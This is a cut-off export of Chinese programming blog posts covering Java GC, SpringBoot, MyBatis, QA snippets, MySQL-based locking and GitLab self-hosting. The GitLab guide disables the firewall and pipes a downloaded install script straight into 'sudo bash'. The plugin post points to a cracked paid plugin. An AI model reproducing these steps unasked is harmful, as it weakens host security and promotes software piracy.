1go get -d -u github.com/envoyproxy/protoc-gen-validate 然后进行到这个项目的目录 12cd $GOPATH/src/github.com/envoyproxy/protoc-gen-validatemake build]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>protoc</tag>
        <tag>wsl</tag>
        <tag>protoc-gen-go</tag>
        <tag>gRPC</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单谈谈Java中的垃圾回收器]]></title>
    <url>%2F2019%2F07%2F31%2F%E7%AE%80%E5%8D%95%E8%B0%88%E8%B0%88Java%E4%B8%AD%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1. 垃圾回收器算法 目前主流垃圾回收器都采用的是可达性分析算法来判断对象是否已经存活，不使用引用计数算法判断对象存活的原因在于该算法很难解决相互引用的问题。 1.1 标记-清除算法（Mark-Sweep）标记-清除算法由标记阶段和清除阶段构成。标记阶段是把所有活着的对象都做上标记的阶段；清除阶段是把那些没有标记的对象，也就是非活动对象回收的阶段。通过这两个阶段，就可以令不能利用的内存空间重新得到利用。 从标记-清除算法我们可以看出，该算法不涉及对象移动，但是可能会产生内存碎片化问题。空间碎片太高可能会导致程序运行时需要分配较大内存时候，无法找到足够的连续内存，需要其他垃圾回收帮助回收内存。 1.2 复制算法（Copying）复制算法内存空间分为两块区域：From、to，每次只使用其中一块，在垃圾回收时将正在使用的内存中的存活对象复制到未被使用的内存块中，之后，清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。 上面那种复制算法有一半的空间是浪费的。所以在Java新生代把内存区域分为Eden空间、from、to空间3个部分，from和to空间也称为survivor 空间，用于存放未被回收的对象。对象开始都是Eden生成；当回收时，将Eden和from中存活的对象移动到to区域中。 复制算法存在空间浪费的情况，始终都要保持一个Survivor是空闲的，并且在GC的时候要是存活对象大小超过了Survivor中的大小，就需要另外的策略存储存活对象。 目前open JDK新生代回收策略就是采用的复制算法，其中Eden和Survivor的默认配置为8:1 1.3 标记-压缩算法（Mark-Compact）标记-压缩算法由标记阶段和压缩阶段构成。标记阶段标记-清除算法中的标记阶段完全一样，压缩阶段是让所有存活的对象向一端移动。这样空闲内存都在另外一端，属于连续空间，不存在内存碎片化问题，但是会产生对象移动。 1.4 分代算法（Generational GC）根据对象的不同生命周期分别管理， JVM 中将对象分为我们熟悉的新生代、老年代和永久代分别管理。这样做的好处就是可以根据不同类型对象进行不同策略的管理，例如新生代中对象更新速度快，就会使用效率较高的复制算法。老年代中内存空间相对分配较大，而且时效性不如新生代强，就会常常使用Mark-Sweep-Compact (标记-清除-压缩)算法。 2. 各个算法的性能比较 标记-清除 复制算法 标记压缩 时间开销 中等 最快 最慢 空间浪费 不存在 存在 不存在 内存碎片化 存在 不存在 不存在 是否移动对象 否 是 是 从表格中我们可以看出，复制算法效率最高，也不存在内存碎片化，但有空间浪费的现象，一般用来处理新生代中的对象而标记-清除算法和标记压缩算法则主要处理老年代中对象内存分配比较大的，并且时效性不如新生代的 3. 常见的垃圾回收器3.1 按照处理过程分类: 串行垃圾回收器（Serial Garbage Collector） 并行垃圾回收器（Parallel Garbage Collector） 并发标记扫描垃圾回收器（CMS Garbage Collector） 3.1.1 串行垃圾回收器 回收器名称 使用的算法 作用区域 单/多线程 备注 Serial 复制算法 新生代 单线程 简单高效，不建议使用，Client默认的 Serial Old 标记-压缩 老年代 单线程 能和所有的Young GC搭配使用 3.1.2 并行垃圾回收器 回收器名称 使用的算法 作用区域 单多线程 备注 ParNew 复制算法 新生代 多线程 唯一和CMS搭配的新生代垃圾回收器 Parallel Scavenge 复制算法 新生代 多线程 更关注于吞吐量 ParNew Old 标记整理 老年代 多线程 搭配Parallel Scavenge垃圾回收器 3.1.3 并发标记扫描垃圾回收器 回收器名称 使用的算法 作用区域 单多线程 备注 CMS 标记-清除 老年代 多线程 追求最短的暂时时间 3.2 按照处理的区域分类：3.2.1 新生代（Young GC） Serial ParNew Parallel Scavenge3.2.2 老年代（Old GC） Serial Old ParNew Old CMS 4. 垃圾回收器的选择策略 客户端程序：Serial + Serial Old； 吞吐率优先的服务端程序（比如：计算密集型）：Parallel Scavenge + Parallel Old； 响应时间优先的服务端程序：ParNew + CMS。 目前很大一部分的Java应用都集中在互联网的服务器端，这类应用尤其关系服务的响应时间，希望应用暂停时间更短，所以基本上使用的都是 ParNew + CMS 在启动JVM参数加上 -XX:+UseConcMarkSweepGC 这个参数表示对于老年代的回收采用 CMS。 4.1 CMS执行过程CMS 的回收过程主要分为下面的几个步骤： 初始标记(Initial Mark） 并发标记(Concurrent marking) 并发预清理(Concurrent pre-preclean) 重新标记(Final Remark） 并发清理(Concurrent sweep) 并发重置(Concurrent reset)]]></content>
      <categories>
        <category>Java,面试,JVM</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>垃圾回收器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot自定义配置文件读取]]></title>
    <url>%2F2019%2F07%2F31%2FSpringBoot%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%2F</url>
    <content type="text"><![CDATA[有时候我们把配置都放到application.yml文件里面会造成此文件相当不好管理，所以我们可以有意识的进行拆分，将一些配置放到其他的配置文件里面，那么我们如何加载并使用它呢，其实很简单，直接读取然后放到Properties对象中就OK了，看代码 读取配置1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.pibgstar.demo.utils;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.util.StringUtils;import java.io.IOException;import java.io.InputStream;import java.io.UnsupportedEncodingException;import java.util.Properties;/** * @author pibigstar * @desc 加载配置文件 **/public class ConfigUtil &#123; private static Logger logger = LoggerFactory.getLogger(ConfigUtil.class); // 配置文件的路径 private static final String CONFIG_NAME = "conf/config.properties"; private static Properties ps; public static int getInt(String key) &#123; String value = getValue(key); return Integer.parseInt(value); &#125; public static String getString(String key) &#123; String value = getValue(key); try &#123; return new String(value.getBytes("iso-8859-1"),"utf-8"); &#125; catch (UnsupportedEncodingException e) &#123; e.printStackTrace(); &#125; return ""; &#125; private static String getValue(String key) &#123; if (ps == null) &#123; init(); &#125; String value = null; if (StringUtils.isEmpty(value)) &#123; value = ps.getProperty(key); &#125; logger.info("key:"+key+"----value:"+value); return value; &#125; private static synchronized void init() &#123; try &#123; InputStream ras = ConfigUtil.class.getClassLoader().getResourceAsStream(CONFIG_NAME); ps = new Properties(); ps.load(ras); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 配置文件放置我们将config.properties放到resources下新建的conf文件夹下面就OK了 12pibigstar.demo.url=http://www.pibigstar.compibigstar.demo.number=8 使用1234567public class TestConfigUtil &#123; public static void main(String[] args)&#123; String url = ConfigUtil.getString("pibigstar.demo.url"); int number = ConfigUtil.getInt("pibigstar.demo.number"); System.out.println(url + " " + number); &#125;&#125;]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>sprintboot</tag>
        <tag>properties</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis联表查询]]></title>
    <url>%2F2019%2F07%2F31%2FMybatis%E8%81%94%E8%A1%A8%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[1 使用注解方式1.1 一对一ClazzModel.java （返回前端的模型） 12345678910public class ClazzModel &#123; private Long id; private String name; private String description; private Grade grade; //联表 private User user;// 联表 //setter、getter&#125; ClazzMapper.java 12345678@Select("select * from poll_clazz")@Results(&#123; //一对一 one = @One() @Result(property="id",column="id"),//不加这个查出来的id会为null @Result(property = "grade",column = "grade_id",one = @One(select="com.pibigstar.dao.GradeMapper.selectByPrimaryKey")), @Result(property = "user",column = "user_id",one = @One(select="com.pibigstar.dao.UserMapper.selectByPrimaryKey"))&#125;)List&lt;ClazzModel&gt; findAll(); 1.2 一对多QuestionModel.java 12345678public class QuestionModel&#123; private Long id; private String name; private String questionType; private List&lt;Options&gt; options; //省略 setter、getter方法&#125; QuestionMapper.java 1234567 @Select("select * from poll_questions") @Results(&#123; // 一对多 many = @Many() @Result(property="id",column="id"),//不加这个查出来的id会为null@Result(property="options",column="id",many=@Many(select="com.pibigstar.dao.OptionsMapper.findAllByQuestionId")) &#125;) List&lt;QuestionModel&gt; findAll(); 1.3 多对多业务介绍： 有一张问卷表（questionnaire），一张题库表（question），一张问卷与题库的桥表（qq） 希望能查出所有的问卷，每个问卷有对应的题 思路：我们先查出所有的问卷，然后通过问卷id 在桥表中查找出此问卷中的所有问题 QuestionnaireModel.java 1234567public class QuestionnaireModel&#123; private Long id; private String name; private String description; private List&lt;QuestionModel&gt; questions; //省略setter、getter方法&#125; QuestionnaireMapper.java 123456@Select("select * from poll_questionnaire")@Results(&#123; @Result(property="id",column="id"), @Result(property="questions",column="id",many=@Many(select="com.pibigstar.dao.QQMapper.selectAllQuestions")),&#125;)List&lt;QuestionnaireModel&gt; findAllModel(); QQMapper.java 123456@Select("select * from poll_questions where id in (select questions_id from poll_qq where questionnaire_id=#&#123;id&#125;)") @Results(&#123; @Result(property="id",column="id"), @Result(property="options",column="id",many=@Many(select="com.pibigstar.dao.OptionsMapper.findAllByQuestionId")) &#125;) List&lt;QuestionModel&gt; selectAllQuestions(Long id); 1.4 注意：分步查询有时候非常浪费数据库资源，我们可以采用懒加载方式，当有需要的时候才进行分步查询使用：fetchType=FetchType.LAZY 12345678@Select("select * from poll_clazz")@Results(&#123; //一对一 one = @One() @Result(property="id",column="id"),//不加这个查出来的id会为null @Result(property = "grade",column = "grade_id",one = @One(fetchType=FetchType.LAZY,select="com.pibigstar.dao.GradeMapper.selectByPrimaryKey")),List&lt;ClazzModel&gt; findAll(); 2 使用xml配置方式2.1 一对一12345678910111213141516&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.briup.apps.poll.dao.extend.ClazzVMMapper"&gt; &lt;resultMap id="clazzVMResultMap" type="com.briup.apps.poll.bean.extend.ClazzVM"&gt; &lt;id column="id" jdbcType="BIGINT" property="id" /&gt; &lt;!-- 联表查询 association --&gt; &lt;association column="grade_id" property="grade" select="com.briup.apps.poll.dao.GradeMapper.selectByPrimaryKey"&gt;&lt;/association&gt; &lt;association column="charge_id" property="charge" select="com.briup.apps.poll.dao.UserMapper.selectByPrimaryKey"&gt;&lt;/association&gt; &lt;/resultMap&gt; &lt;select id="selectById" parameterType="java.lang.Long" resultMap="clazzVMResultMap"&gt; select * from poll_clazz where id=#&#123;id&#125;; &lt;/select&gt; &lt;/mapper&gt; 2.2 一对多1234567891011121314151617181920212223242526272829&lt;resultMap type="com.User" id="userAndItemsResultMap"&gt; &lt;!-- 用户信息 --&gt; &lt;id column="user_id" property="id"/&gt; &lt;result column="username" property="username"/&gt; &lt;result column="sex" property="sex"/&gt; &lt;result column="address" property="address"/&gt; &lt;!-- 一个用户对应多个订单 --&gt; &lt;collection property="ordersList" ofType="com.Orders"&gt; &lt;id column="id" property="id"/&gt; &lt;result column="user_id" property="userid"/&gt; &lt;result column="number" property="number"/&gt; &lt;result column="createtime" property="createTime"/&gt; &lt;result column="note" property="note"/&gt; &lt;!-- 一个订单对应多个订单明细 --&gt; &lt;collection property="orderdetails" ofType="com.OrderDetail"&gt; &lt;id column="orderdetail_id" property="id"/&gt; &lt;result column="items_id" property="itemsId"/&gt; &lt;result column="items_num" property="itemsNum"/&gt; &lt;result column="orders_id" property="ordersId"/&gt; &lt;!-- 一个订单明细对应一个商品 --&gt; &lt;association property="items" javaType="com.Items"&gt; &lt;id column="items_id" property="id"/&gt; &lt;result column="items_name" property="itemsName"/&gt; &lt;result column="items_detail" property="detail"/&gt; &lt;result column="items_price" property="price"/&gt; &lt;/association&gt; &lt;/collection&gt; &lt;/collection&gt; &lt;/resultMap&gt;]]></content>
      <categories>
        <category>Java,数据库,mybatis,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
        <tag>联表查询</tag>
        <tag>注解联表查询</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用java打开网页并截图]]></title>
    <url>%2F2019%2F07%2F31%2F%E4%BD%BF%E7%94%A8java%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5%E5%B9%B6%E6%88%AA%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[控制浏览器打开网页只适用于JDK1.6之上的 1234567891011121314151617181920212223242526272829303132333435363738package com.pibgstar.demo.utils;import javax.imageio.ImageIO;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.image.BufferedImage;import java.io.File;import java.io.IOException;import java.net.URISyntaxException;import java.net.URL;/** * @author pibigstar * @desc 网页截图工具类 **/public class CutPictureUtil &#123; public static void main(String[] args) throws IOException, URISyntaxException, AWTException &#123; // 控制浏览器打开网页，仅适用于JdK1.6及以上版本 Desktop.getDesktop().browse(new URL("https://blog.csdn.net/junmoxi").toURI()); Robot robot = new Robot(); // 延迟一秒 robot.delay(1000); // 获取屏幕宽度和高度 Dimension d = new Dimension(Toolkit.getDefaultToolkit().getScreenSize()); int width = (int) d.getWidth(); int height = (int) d.getHeight(); // 最大化浏览器 robot.keyRelease(KeyEvent.VK_F11); robot.delay(1000); // 对屏幕进行截图 Image image = robot.createScreenCapture(new Rectangle(0, 0, width, height)); // 通过图形绘制工具类将截图保存 BufferedImage img = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); Graphics g = img.createGraphics(); g.drawImage(image, 0, 0, width, height, null); // 保存图片 ImageIO.write(img, "jpg", new File("D:/tmp/"+System.currentTimeMillis()+".jpg")); System.out.println("done!"); &#125;&#125;]]></content>
      <categories>
        <category>Java,java工具类</category>
      </categories>
      <tags>
        <tag>打开网页</tag>
        <tag>网页截图</tag>
        <tag>截屏</tag>
        <tag>robot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS前端随笔小记]]></title>
    <url>%2F2019%2F07%2F20%2FJS%E5%89%8D%E7%AB%AF%E9%9A%8F%E7%AC%94%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[获取点击处附近的值12345678&lt;div class="input-group ebs-modal-choose"&gt; &lt;input name="username" value="$&#123;item.bidPrice&#125;"&gt; &lt;div class="input-group-addon"&gt; &lt;span class=" btn-default selectPrice"&gt; &lt;i class="epsicons icon-select1"&gt;&lt;/i&gt; &lt;/span&gt; &lt;/div&gt;&lt;/div&gt; 点击span按钮时获取input中的值 123 $(document).on('click', '.selectPrice',function()&#123; var username= $(this).parent().parent().find("input[name='username']").val();&#125;); this 对象指的是点击的span标签对象，第一个parent获取到它的父级div对象，再通过parent获取div的父级对象div，在获取此div下面input对象的值。 禁止a标签点击1&lt;a class="disable"&gt;pibigstar&lt;/a&gt; 123.disable&#123; pointer-events:none;&#125; 输出横竖表格1234567891011121314151617181920&lt;table id="priceTable" class="table scroll table-bordered" border="1"&gt; &lt;tbody id="priceTbody"&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;c:forEach items="$&#123;srModel.levelInfos&#125;" var="levelInfo"&gt; &lt;td&gt;$&#123;levelInfo&#125;&lt;/td&gt; &lt;/c:forEach&gt; &lt;/tr&gt; &lt;c:forEach items="$&#123;srModel.itemInfos&#125;" var="itemInfo"&gt; &lt;tr&gt; &lt;td&gt;$&#123;itemInfo&#125;&lt;/td&gt; &lt;c:forEach items="$&#123;srModel.levelInfos&#125;" var="levelInfo"&gt; &lt;td&gt; &lt;input name="price" &gt; &lt;/td&gt; &lt;/c:forEach&gt; &lt;/tr&gt; &lt;/c:forEach&gt; &lt;/tbody&gt; &lt;/table&gt; 遍历数组1234var content = ["1","2","3"];$.each(content, function(i,item)&#123; console("下标："+ i +"值："+item);&#125;) 对象转JSON123456var data = [];data[0] = new Object();data[0].id = 1;data[0].name = "pibigstar";var str = JSON.stringify(data);[&#123;"id":"1","name":"pibigstar"&#125;] 新增/删除CSS样式12$("#itemDiv").removeClass("hidden");$("#itemDiv").addClass("hidden"); 获取点击处在此列表中的位置123 $(document).on('click','.deleteItemBtn',function() &#123; var currentCell =$("#myUl li").index(this) + 1;&#125;)]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[程序员开发必备工具（一）之IDEA插件]]></title>
    <url>%2F2019%2F07%2F20%2F%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BC%80%E5%8F%91%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7%EF%BC%88%E4%B8%80%EF%BC%89%E4%B9%8BIDEA%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[@[TOC] 1. 必备的IDEA插件1.1 mybatiscodehelperpromybatis代码自动生成插件，大部分单表操作的代码可自动生成 减少重复劳动 大幅提升效率。同时可在XML和接口间跳转。破解版：下载 1.2 Translation翻译插件，开发必不可少的 1.3 Maven Helper检测Maven依赖冲突的 1.4 GsonFormat根据JSON生成实体类。 1.5 RestfulToolkit根据URL路径快速定位到方法。快捷键 ctrl + Alt + N 1.6 Alibaba Java Coding Guidelines阿里巴巴出品的代码风格检查，可以扫描整个项目 找到不规范的地方 并且大部分可以自动修复。 1.7 FindBugs-IDEA检测代码中可能的bug及不规范的位置，写完代码后检测下 避免低级bug 1.8 SequenceDiagram根据代码生成时序图 1.9 .NR Null Object Nullable是空对象的相关操作接口，用于确定对象是否为空，因为在空对象模式中，对象为空会被包装成一个Object，成为Null Object，该对象会对原有对象的所有方法进行空实现。 分析所选类可声明为接口的方法； 抽象出公有接口； 创建空对象，自动实现公有接口； 对部分函数进行可为空声明； 1.10 .ignore生成各种ignore文件，一键创建git ignore文件的模板，免得自己去写 关注我微信公众号每天获取更多干货。]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>idea</tag>
        <tag>程序员工具</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页中QQ常用代码]]></title>
    <url>%2F2019%2F07%2F16%2F%E7%BD%91%E9%A1%B5%E4%B8%ADQQ%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[@[toc] 1. 点击链接打开会话窗口1234&lt;a href="http://wpa.qq.com/msgrd?v=3&amp;uin=741047261&amp;site=qq&amp;menu=yes"&gt;点击与我联系&lt;/a&gt;&lt;!--下面这个也可以实现 --&gt;tencent://message/?Menu=yes&amp;uin=741047261&amp;Service=300&amp;sigT=45a1e5847943b64c6ff3990f8a9e644d2b31356cb0b4ac6b24663a3c8dd0f8aa12a595b1714f9d45 2. 点击链接添加好友1&lt;a href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=741047261&amp;website=www.oicqzone.com"&gt;添加好友&lt;/a&gt; 3. 点击加群 进入 https://qun.qq.com/join.html 选择哪个群 复制网页代码即可1&lt;a href="https://shang.qq.com/wpa/qunwpa?idkey=875408aae56499d92ddcdda3966fa7c01e1d3b587b038d335917df7d41893170"&gt;点击进群&lt;/a&gt; 4. 手机中网页点击链接打开指定会话窗口1&lt;a href="mqqwpa://im/chat?chat_type=wpa&amp;uin=5741047261&amp;version=1&amp;src_type=web&amp;web_src=oicqzone.com"&gt;点击联系我&lt;/a&gt; 5. Android中打开指定QQ会话窗口12String url="mqqwpa://im/chat?chat_type=wpa&amp;uin=741047261"; startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url))); 6. Android中打开指定应用程序1234567891011121314151617Intent intent = new Intent();ComponentName cmp = new ComponentName("com.sina.weibo","com.sina.weibo.EditActivity");intent.setAction(Intent.ACTION_MAIN);intent.addCategory(Intent.CATEGORY_LAUNCHER);intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);intent.setComponent(cmp);startActivityForResult(intent, 0);/**另：几个常用的Package命令：新浪微博（编辑界面）：com.sina.weibo com.sina.weibo.EditActivity腾讯微博（编辑界面）：com.tencent.WBlog com.tencent.WBlog.activity.MicroblogInput微信： com.tencent.mm com.tencent.mm.ui.LauncherUIQQ: com.tencent.mobileqq com.tencent.mobileqq.activity.HomeActivity**/ 7. 获取QQ头像 http://q1.qlogo.cn/g?b=qq&amp;nk=741047261&amp;s=100 http://q2.qlogo.cn/headimg_dl?dst_uin=741047261&amp;spec=100 nk是你的QQ号，s是尺寸，尺寸对应关系可以看下图]]></content>
      <categories>
        <category>工具使用,随笔小记</category>
      </categories>
      <tags>
        <tag>QQ</tag>
        <tag>加群链接</tag>
        <tag>打开QQ会话</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Mysql实现锁机制]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%9F%BA%E4%BA%8EMysql%E5%AE%9E%E7%8E%B0%E9%94%81%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[1 ReentrantLock它是一个可重入锁，即一个线程可重复加锁，即当前线程获取该锁再次获取不会被阻塞。获得几次锁，解锁也要解几次。它有两种实现，公平锁和非公平锁。 公平锁：锁的获取顺序就应该符合请求上的绝对时间顺序 非公平锁：不按请求的时间，谁抢到就是谁的 默认实现的为非公平锁，因为公平锁为了保证时间上的绝对顺序，需要频繁的上下文切换，而非公平锁会降低一定的上下文切换，降低性能开销。 12//创建一个公平锁Lock lock = new ReentrantLock(true); 2. 通过MySQL的GET_LOCK函数实现获得锁1GET_LOCK(str,timeout) 根据字符串str 得到一个锁，超时为timeout 秒。若成功得到锁，则返回 1，若操作超时则返回0 ，当它获得锁之后，后面相同str的再获取这把锁就会一直等待，当超过timeout，就会返回0 释放锁1RELEASE_LOCK(str); 释放str这把锁，当连接中断后，这把锁也会释放的 使用12345获取锁SELECT GET_LOCK(&quot;pibigstar&quot;,10)；释放锁SELECT RELEASE_LOCK(“pibigstar”); 3 通过MySQL行级锁进行实现原理很简单，我们插入数据的时候都是只能插入一个唯一主键，如果有一个线程插入了，那么其他线程都不能插入了。 插入实体 123456789101112131415package com.pibigstar.domain;import javax.persistence.Entity;import javax.persistence.Id;@Entitypublic class Mysql &#123; @Id private int id; public Mysql(int id) &#123; this.id = id; &#125; //setter、getter方法&#125; dao层：使用jpa 123456789package com.pibigstar.dao;import org.springframework.data.jpa.repository.JpaRepository;import com.pibigstar.domain.Mysql;public interface MysqlLockDao extends JpaRepository&lt;Mysql, Integer&gt;&#123;&#125; 具体实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.pibigstar.utils;import java.util.Random;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.Condition;import java.util.concurrent.locks.Lock;import org.springframework.beans.factory.annotation.Autowired;import com.pibigstar.dao.MysqlLockDao;import com.pibigstar.domain.Mysql;/** * 基于mysql实现可重入锁 * @author pibigstar * */public class MysqlLock implements Lock&#123; @Autowired private MysqlLockDao mysqlLockDao; private static final Mysql my = new Mysql(1); @Override public void lock() &#123; //阻塞锁，不拿到资源不罢休 if (!tryLock()) &#123; try &#123; //如果没拿到，睡一下再拿 Thread.sleep(new Random().nextInt(10)+1); &#125; catch (InterruptedException e) &#123; &#125; lock();//继续调用自身拿锁 &#125; &#125; @Override public boolean tryLock() &#123; //非阻塞锁，拿一次，拿到就拿到了，拿不到就撤 try &#123; mysqlLockDao.save(my);//插入成功即是拿到了 return true; &#125; catch (Exception e) &#123; //有异常说明已经被其他线程拿到了， return false; &#125; &#125; @Override public void unlock() &#123; //解锁，将值删除即可 mysqlLockDao.delete(my); &#125; @Override public boolean tryLock(long time, TimeUnit unit) throws InterruptedException &#123; return false; &#125; @Override public void lockInterruptibly() throws InterruptedException &#123; &#125; @Override public Condition newCondition() &#123; return null; &#125;&#125;]]></content>
      <categories>
        <category>Java,mysql</category>
      </categories>
      <tags>
        <tag>reentrantlock</tag>
        <tag>锁</tag>
        <tag>Get_LOCK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自建gitlab仓库]]></title>
    <url>%2F2019%2F07%2F16%2F%E8%87%AA%E5%BB%BAgitlab%E4%BB%93%E5%BA%93%2F</url>
    <content type="text"><![CDATA[1. 关闭防火墙12345# 关闭防火墙systemctl stop firewalld# 阻止防火墙开机自启systemctl disable firewalld 2. 安装sshd123sudo yum install -y curl policycoreutils-python openssh-serversudo systemctl enable sshdsudo systemctl start sshd 3. 安装邮件服务 主要是为了gitlab能通过邮件进行通知 123sudo yum install postfixsudo systemctl enable postfixsudo systemctl start postfix 4. 安装gitlabgitlab的安装地址为：https://docs.gitlab.com/omnibus/manual_install.html 有社区版（ce）和企业版（ee），这里建议你使用企业版 安装脚本地址：https://packages.gitlab.com/gitlab/gitlab-ee/install#bash-rpm 1curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ee/script.rpm.sh | sudo bash 安装 1yum install -y gitlab-ee gitlab-ee会被安装/opt/gitlab目录下可通过下面命令查看 1rpm -ql gitlab-ee | less 5. 配置gitlab 配置项非常多，这里我们就简单配置下gitlab的地址与端口gitlab的配置文件在/etc/gitlab/目录下，主要配置文件为gitlab.rb 详细配置可查看文档：https://docs.gitlab.com/omnibus/settings/configuration.html 更改gitlab地址 12345改: external_url 'http://gitlab.example.com'为: external_url 'http://139.189.64.100:8500' #你的IP地址或域名改: # unicorn['port'] = 8080为: unicorn['port'] = 8500 设置邮箱这里以163邮箱为例，QQ邮箱设置与其类似 12345678gitlab_rails['smtp_enable'] = truegitlab_rails['smtp_address'] = "smtp.163.com"gitlab_rails['smtp_port'] = 25gitlab_rails['smtp_user_name'] = "test@163.com"gitlab_rails['smtp_password'] = "password"gitlab_rails['smtp_authentication'] = "login"gitlab_rails['smtp_enable_starttls_auto'] = truegitlab_rails['gitlab_email_from'] = "test@163.com" 重新加载配置文件 1sudo gitlab-ctl reconfigure 这个过程有点慢，耐心等待… 重启gitlab 1gitlab-ctl restart 浏览器打开该地址，第一次进入，会让你设置密码 6. gitlab基本操作6.1 创建群组企业内部使用，可以创建一个群组，方便我们后期管理我们的项目 6.2 创建项目新创建的项目，要新增一个文件，不然master分支什么的都不会出来，有点坑 设置提交权限 6.3 创建其他用户 只需要填这三个 设置密码 6.4 将用户添加到项目中这里就体现出了创建群组的好处，我们可以将用户添加到群组中，这样群组中的项目，该用户都有权限了 7. 注意如果你是HTTP，clone 一定要采用 ssh方式，ssh秘钥生成方式 1ssh-keygen -t rsa -C “username@*.com” 将 id_rsa.pub 里面的内容copy到gitlab的SSH配置里]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot使用异步任务]]></title>
    <url>%2F2019%2F07%2F16%2FSpringBoot%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[1. 开启异步任务1234567891011121314package com.pibigstar;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.scheduling.annotation.EnableAsync;@SpringBootApplication@EnableAsync //开启异步任务public class SpringbootDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringbootDemoApplication.class, args); &#125;&#125; 2. 编写异步任务123456789101112131415161718192021222324252627282930313233343536373839404142package com.pibigstar.task;import java.util.concurrent.Future;import org.springframework.scheduling.annotation.Async;import org.springframework.scheduling.annotation.AsyncResult;import org.springframework.stereotype.Component;@Componentpublic class AsyncTask &#123; @Async //异步方法注解 public Future&lt;Boolean&gt; task1() throws InterruptedException &#123; long start = System.currentTimeMillis(); Thread.sleep(1000); long end = System.currentTimeMillis(); System.out.println("=====任务1 耗时："+(end-start)+"======"); //返回true，告诉此任务已完成 return new AsyncResult&lt;Boolean&gt;(true); &#125; @Async //异步方法注解 public Future&lt;Boolean&gt; task2() throws InterruptedException &#123; long start = System.currentTimeMillis(); Thread.sleep(800); long end = System.currentTimeMillis(); System.out.println("=====任务2 耗时："+(end-start)+"======"); //返回true，告诉此任务已完成 return new AsyncResult&lt;Boolean&gt;(true); &#125; @Async //异步方法注解 public Future&lt;Boolean&gt; task3() throws InterruptedException &#123; long start = System.currentTimeMillis(); Thread.sleep(600); long end = System.currentTimeMillis(); System.out.println("=====任务3 耗时："+(end-start)+"======"); //返回true，告诉此任务已完成 return new AsyncResult&lt;Boolean&gt;(true); &#125;&#125; 3. 启动异步任务12345678910111213141516171819202122232425262728293031323334353637package com.pibigstar.web;import java.util.concurrent.Future;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import com.pibigstar.task.AsyncTask;@RestController@RequestMapping("/task")public class AsyncTaskController &#123; @Autowired private AsyncTask asyncTask; @GetMapping("test") public String test() throws InterruptedException &#123; long start = System.currentTimeMillis(); Future&lt;Boolean&gt; a = asyncTask.task1(); Future&lt;Boolean&gt; b = asyncTask.task2(); Future&lt;Boolean&gt; c = asyncTask.task3(); //循环到三个任务全部完成 while (!a.isDone()||!b.isDone()||!c.isDone()) &#123; if (a.isDone()&amp;&amp;b.isDone()&amp;&amp;c.isDone()) &#123; break; &#125; &#125; long end = System.currentTimeMillis(); String result = "任务完成，一共用时为："+(end-start)+"毫秒"; System.out.println(result); return result; &#125;&#125; 4. 运行结果 任务1 睡眠了 1000毫秒，任务2 睡眠了800毫秒，任务3 